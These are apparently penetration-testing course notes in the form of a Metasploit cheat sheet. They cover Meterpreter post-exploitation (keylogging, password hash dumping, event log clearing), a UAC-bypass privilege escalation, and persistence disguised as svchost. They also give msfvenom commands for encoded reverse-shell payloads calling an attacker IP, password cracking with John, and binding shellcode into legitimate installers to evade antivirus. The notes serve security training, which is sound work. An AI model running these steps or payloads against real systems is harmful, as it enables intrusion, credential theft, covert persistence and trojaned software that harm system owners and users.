**Instructor: Alexis Ahmed**

#### Metasploit Framework Util:

- Modules available in **metasploit** / **msfconsole** / **msfc**:
    |auxiliary|encoders|evasion|exploits|nops|payloads|post| 
    |-|-|-|-|-|-|-|
    - All modules can be found in this location: `/usr/share/metasploit-framework/modules/`
    - There is also a GUI version of metasploit called `Armitage`
- `?` - general documentation regarding all commands available in msfconsole
- `search <module_search_term>` - search for any module present in msfc
- `use <module/sub_module/.../module_name>` - set msfc to use a module
- `show info` - show information about a module after it is selected using the `use` command
- `show options` - show parameters or options to set and needed to run a specific module
- `set <param_name> <param_value>` - set the param value for a specific param name. `<param_name>` can be seen using the `show options` command
- `run | exploit` - execute the selected metasploit module
- `sessions` - view all sessions running in the background
- `sessions <Id>` - put session number \<Id\> to the foreground

---

#### Meterpreter Utils:

#### Meterpreter is the session that is gained after successful exploitation of a target machine with the help of an exploit.

- #### Post Exploitation:
  - `?` - Help menu
  - `background` - send **meterpreter** session to background and return to **msfc**
  - `sysinfo` - Retrieve target machine's info
  - `upload <file_to_upload> ` - upload a file to target's machine
  - `download <file_to_download> ` - download a file to attacker's machine
  - `sysinfo` - Retrieve target machine's info
  - `ps` - List all running processes in the target machine (Some process attributes might be hidden due to restricted privilege)
  - `pgrep <process_name>` - display the **PID** of a specific `<process_name>`
  - `getsystem` - Escalate Privilege 
  - `migrate <PID>` - migrate to another process running on the target machine
    > This command is mostly (sometimes exploit does the heavy lifting and command can be executed directly) used during the **[Privilege Escalation](#privilege-escalation)** phase since we need to **attach** the meterpreter process in the target machine to a process that:
    > - runs on high privilege and runs always(process such as **winlogon.exe** can be used)
    > - change to a different architecture i.e. change from **x86 to x64 or vice versa** to avoid system crashes). `sysinfo` meterpreter command can be used to check what architecture the **meterpreter session** is running as along with the **OS's architecture**. Make sure they're the same for the purpose of stable command execution
  - `getuid` - Retrieve current user's ID
    > `NT AUTHORITY\SYSTEM` also called **Administrator** i.e. the account with the highest privilege in windows similar to `root` in **linux**. Other than that are normal user accounts.
  - `cd <directory>` - change directory in target pc
    > Commands used in the meterpreter session are of **linux** based i.e. instead of using `chdir` in windows we can use `cd` command itself to change directory in target windows machine. Also windows based commands can only be used after entering the windows `shell` and not in the meterpreter session itself. In other words:
    >
    >`cd C:\\\\` can be used and not `chdir C:\\\\` in the meterpreter session
  - `hashdump` - Dump Windows password hashes (Need Admin Privilege to dump. Also using this against recent version of windows won't work since they are protected)
  - `keyscan_start | keyscan_stop | keyscan_dump` - Start capturing keystrokes, stop and dump to attacker's machine
    > **NOTE: Executing this in a Virtual Machine won't work since USB protocols work differently in it)**
  - `shell` - Gives the command prompt exactly the one we use in windows (**cmd.exe**)
    > All commands used in windows normally can be used in this shell:
    > - `ipconfig` - View network information
    > - `exit` - Exit from **windows shell** to **meterpreter** session
    > - `route` - View network routing information
    > - `net users` - View all users on the target system
  -  `clearev` - Clear the event log
  -  `exit` - exit the **meterpreter** session and return to **msfc**

- #### Privilege Escalation:

  - #### Sometimes the `getsystem` command used in the **meterpreter** session won't work to escalate privilege depending on the exploit used along with other commands like `ps`, `migrate`, `hashdump` etc. Instead of that we'll manually find out the local privilege escalation exploit. To ease on this we'll `search suggester` in **msfc** and a module called `multi/recon/local_exploit_suggester` can be used. Using that we get a list of all possible exploits that can be used to escalate our privilege in the target machine. For that we can `background` our current **meterpreter** session and make note of the session ID using the command `sessions` as we'll be entering it in the `set SESSION <backgrounded_meterpreter_session_ID>` option for the selected local exploit as follows:

    > msf\> `use exploit/multi/recon/local_exploit_suggester`
    >
    > msf **exploit(exploit/multi/recon/local_exploit_suggester)** \> `set SESSION <backgrounded_meterpreter_session_ID>`
    >
    > msf **exploit(exploit/multi/recon/local_exploit_suggester)** \> `run`
    >
    > [*] <target's_ip> - Collecting local exploits for x86/windows ...
    >
    > [*] <target's_ip> - 34 exploit are being tried...
    >
    > [+] <target's_ip> - **exploit/windows/local/bypassuac_eventvwr**: The target appears to be vulnerable.
    >
    > [+] <target's_ip> - **exploit/windows/local/ms10_015_kitrap0d**: The service is running but could not be validated.
    >
    > .
    >
    > .
    >
    > .
    >
    > [*] Post module execution completed
    
    #### Out of the several exploits shown we can try running each one of the local exploit until we succeed but instead we can make use of the `sysinfo` command in the meterpreter shell and get some amount of information about the target machine's OS and further search on that factor, reducing the amount of trial and error significantly. For now we proceed with the `exploit/windows/local/bypassuac_eventvwr` module as follows:

    > msf **exploit(exploit/multi/recon/local_exploit_suggester)** \> `use exploit/windows/local/bypassuac_eventvwr`
    >
    > [*] Using configured payload configured, defaulting to windows/meterpreter/reverse_tcp
    
    #### Make sure to set a unique port by making no clashes with the already opened ones. Use `sessions` command in msfc and under the **Connection column** check for the ports that are already used. Then,

    > msf **exploit(exploit/windows/local/bypassuac_eventvwr)** \> `set LPORT <unique_port>`
    >
    > msf **exploit(exploit/windows/local/bypassuac_eventvwr)** \> `set SESSION <backgrounded_meterpreter_session_ID>`
    >
    > msf **exploit(exploit/windows/local/bypassuac_eventvwr)** \> `run`

- #### Persistence / Maintaining Access:

  - #### We also need to maintain our session across target machine's restart. For that `background` the session if in foreground then `search persistence` in **msfc** and select the **local exploit** for the target machine as follows:

    > msf\> `use exploit/windows/local/persistence`
    >
    > [*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
    >
    > msf **exploit(windows/local/persistence)** \> `[show options | show advanced]`
    >
    > msf **exploit(windows/local/persistence)** \> `set LPORT 1234`
    >
    > msf **exploit(windows/local/persistence)** \> `set EXE_NAME svchost`
    >
    > msf **exploit(windows/local/persistence)** \> `set SESSION <backgrounded_meterpreter_session_ID>`
    >
    > msf **exploit(windows/local/persistence)** \> `run`

  - #### Now using the `exploit/multi/handler` module in **msfc** we can re-establish a communication channel with the target machine as follows:

    > msf> `use exploit/multi/handler`
    >
    > msf **exploit(multi/handler)** > `set payload windows/meterpreter/reverse_tcp`
    >
    > msf **exploit(multi/handler)** > `set LHOST <attacker's_ip>`
    >
    > msf **exploit(multi/handler)** > `set LPORT 1234`
    >
    > [*] Started reverse TCP handler on \<attacker's_ip\>:4444

---

#### Msfvenom Util:

- `msfvenom -p windows[/x64]/meterpreter/reverse_tcp LHOST=<attacker's_ip> LPORT=4444 -f exe > <payload_name>.exe` - Creating an x32 or x64 Windows Reverse Meterpreter Payload with no encoding
- `msfvenom --list encoders` - lists out all the available encoders
- `msfvenom --p windows/meterpreter/reverse_tcp LHOST=<attacker's_ip> LPORT=4444 -f exe -e x86/shikata_ga_nai -i 5 -b '\x00\xff' > <payload_name>.exe` - Creating an x32 Windows Reverse Meterpreter Payload with **shikata_ga_nai** encoder with **5** iterations, avoiding bad characters '**\x00\xff**'

#### Payloads created using msfvenom can be taken control using the `exploit/multi/handler` module present in msfc. Make sure that the payload being reverse/bind type should be set to the same architecture on the attacker's as well as the target's machine when connecting
> msf> `use exploit/multi/handler`
>
> msf **exploit(multi/handler)** > `set payload windows/meterpreter/reverse_tcp`
>
> msf **exploit(multi/handler)** > `set LHOST <attacker's_ip>`
>
> [*] Started reverse TCP handler on \<attacker's_ip\>:4444

---

#### Dumping, Cracking Passwords:

- Dumping:

  To dump passwords from the target machine we can make use of:
  - `hashdump` command from **meterpreter** session
  - [Windows Credentials Editor](https://www.ampliasecurity.com/research/windows-credentials-editor/) that is already present in most of the penetration testing linux distros in the following location: `/usr/share/windows-resources/wce/`. Some flags definitions are as follows:
    - `-h` - Open wce help menu
    - `-l` - List logon sessions and NTLM credentials
    - `-w` - dump cleartext passwords stored by the digest authentication package

- Cracking:

  - For cracking passwords we need a wordlist that is again already present in penetration testing linux distros by default in the following locations:
    - `usr/share/john/password.lst`
    - `usr/share/wordlists/rockyou.txt.gz` (to unzip: `gzip -d /usr/share/wordlists/rockyou.txt.gz`)
  - Using **John the Ripper** we can perform password cracking:
    > $ `john --format=NT --wordlist=<wordlist_file>.txt <hashdump_file>.txt`

---

Stealth Util:

- [Shellter](https://www.shellterproject.com/introducing-shellter/)
  > Shellter is a dynamic shellcode injection tool, and the first truly dynamic PE infector ever created. It can be used in order to inject shellcode into native Windows applications (currently 32-bit applications only). The shellcode can be something yours or something generated through a framework, such as Metasploit. **Wine32** is required to run in linux.
  - The way to use this is to bind a legit installer such as **winrar.exe** or any other setup application with the shellcode.
  - Then setup the `exploit/multi/handler` in msfc to establish a communication channel but with more stealth

- [Veil](https://github.com/Veil-Framework/Veil)
  > Designed to generate metasploit payloads that bypasses common anti-virus solutions.
  >
  > **NOTE: This application is not a trojan creator but only creates payloads**

  - Run this application using root privilege in linux
  - Requirements such as **Wine32** and **PyInstaller** should be installed before running

---
